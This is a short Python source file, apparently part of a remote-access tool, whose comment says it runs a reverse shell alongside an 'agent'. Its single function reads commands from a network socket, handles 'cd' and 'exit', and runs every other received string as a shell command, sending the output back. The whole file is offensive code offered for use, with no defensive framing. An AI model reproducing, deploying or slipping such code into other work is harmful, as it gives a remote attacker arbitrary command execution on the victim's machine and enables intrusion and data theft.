import os
import subprocess
import sys

#Script to run reverse shell together with the agent


def shell(s,host,port):
        while True:
            s.send(str.encode(": "))
            data = s.recv(1024)
            if str(data[:2].decode("utf-8")) == 'cd':
                try:
                    os.chdir(data[3:].decode("utf-8"))
                except:
                    s.send(str.encode("No directory here!"))
            if str(data[:4].decode("utf-8")) == 'exit':
                    break        
            if str(data[:].decode("utf-8")) == 'cd ..':
                os.chdir('..') 
            if len(data.decode("utf-8")) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE) 
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes, "utf-8")
                    s.send(str.encode(output_str + str(os.getcwd()) + "> "))    
                except:
                    s.send(str.encode("No possible send data! some error appers!"))
		 
